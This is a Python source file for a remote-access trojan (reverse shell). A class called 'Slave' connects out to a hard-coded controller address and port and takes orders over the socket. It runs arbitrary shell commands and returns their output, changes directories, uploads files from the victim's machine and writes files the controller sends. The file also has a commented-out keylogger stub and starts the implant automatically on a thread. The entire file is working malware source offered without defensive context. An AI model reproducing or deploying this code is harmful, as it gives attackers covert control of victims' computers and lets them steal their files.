import os
import threading
import glob
import subprocess
import socket
import platform


encrypted_tunnel = False


class Slave(socket.socket):
    def __init__(self, fam, proto):
        socket.socket.__init__(self, fam, proto)
        IP = '192.168.1.102'
        PORT = 5000
        self.connect((IP, PORT))
        self.Oder()

    def Oder(self):
        while True:
            try:
                data = self.recv(2048)
                data = data.decode('utf-8')
                print(data)
                if data[:2] == "cd":
                    os.chdir(data[3:])
                    self.send(str(os.getcwd()).encode('utf-8'))
                elif data[:8] == "download":
                    print("1")
                    self.download(data[9:])
                elif data[:6] == "upload":
                    self.upload(data[7:])
                    self.send("[+] Upload Complete".encode('utf-8'))

                else:
                    cmd = subprocess.Popen(
                        data[:], shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    command_out_bytes = cmd.stdout.read()
                    self.send(command_out_bytes)
            except Exception as e:
                print(e)
                self.send("[+] No such command".encode('utf-8'))

    def upload(self, file):
        self.send("fsize".encode('utf-8'))
        fsize = self.recv(2048)
        fsize = fsize.decode('utf-8')
        self.send('DONE'.encode('utf-8'))
        f = open(file, 'wb')
        data = self.recv(2048)
        totalRecv = len(data)
        f.write(data)
        while totalRecv < int(fsize):
            data = self.recv(2048)
            totalRecv += len(data)
            f.write(data)

    def download(self, file):
        if os.path.isfile(file):
            self.send("EXISTS".encode("utf-8") + ' '.encode('utf-8') +
                      str(os.path.getsize(file)).encode('utf-8'))
            resp = self.recv(2048)
            resp = resp.decode('utf-8')
            if resp == "Listening":
                with open(file, 'rb') as f:
                    data = f.read(2048)
                    self.send(data)
                    while data != b'':
                        data = f.read(2048)
                        self.send(data)
                    print("DONE")

    # def keylogger(self):
    #     with


#Slave(socket.AF_INET, socket.SOCK_STREAM)
t = threading.Thread(target=Slave, args=(socket.AF_INET, socket.SOCK_STREAM))
t.daemon = False
t.start()
